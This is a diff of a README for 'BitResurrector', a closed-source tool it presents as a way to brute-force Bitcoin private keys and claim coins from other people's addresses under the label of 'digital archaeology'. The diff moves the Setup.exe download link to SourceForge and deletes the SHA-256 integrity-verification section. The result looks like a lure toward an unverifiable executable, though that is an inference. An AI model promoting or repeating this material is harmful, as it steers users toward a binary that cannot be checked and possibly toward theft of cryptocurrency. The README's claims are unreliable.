@@ -13,7 +13,8 @@
 **BitResurrector** is a research-grade instrument for **Digital Archaeology** and blockchain forensic analysis. This free software is designed to explore the mathematical address space of early-era Bitcoin networks to discover abandoned assets. By generating private keys and instantly matching them against a comprehensive global database (from **Loyce Club**) containing over **58 million active addresses**, users can recover lost wealth from the "digital necropolis" of the blockchain.
 
 ### 🔗 Official Project Links
-*   **Live Web Dashboard & Documentation**: [https://www.academia.edu/165402361/BitResurrector_Technical_White_paper](https://www.academia.edu/165402361/BitResurrector_Technical_White_paper)*   **Technical Article**: [https://ai-seedfinder.com/btcrecovery](https://ai-seedfinder.com/btcrecovery)
+*   **Live Web Dashboard & Documentation**: [https://www.academia.edu/165402361/BitResurrector_Technical_White_paper](https://www.academia.edu/165402361/BitResurrector_Technical_White_paper)
+*   *   **Technical Article**: [https://ai-seedfinder.com/btcrecovery](https://ai-seedfinder.com/btcrecovery)
 
 ---
 
@@ -71,13 +72,8 @@ The software automatically detects hardware configuration and adjusts the load, 
 
 ## 📦 Distribution & Safety
 
-### [💾 Download Official Installer (v3.0.3 Setup.exe)](https://github.com/leadzevs/BitResurrector/releases)
+### [💾 Download Official Installer (v3.0.3 Setup.exe)](https://sourceforge.net/projects/bitresurrector/files/latest/download)
 *Note: This release is a closed-source research build to protect the core intellectual property from unauthorized cloning.*
-
-### 🛡️ Integrity Verification
-To ensure you have the original, untampered file, please verify the SHA-256 hash:
-- **Official Hash**: `0ed85ec082a546220f33dbb97c59f8a4fc054121bced70001f4b53d68846abad`
-- **Verification Guide**: See [CHECKSUMS.md](./CHECKSUMS.md).
 
 ---
 
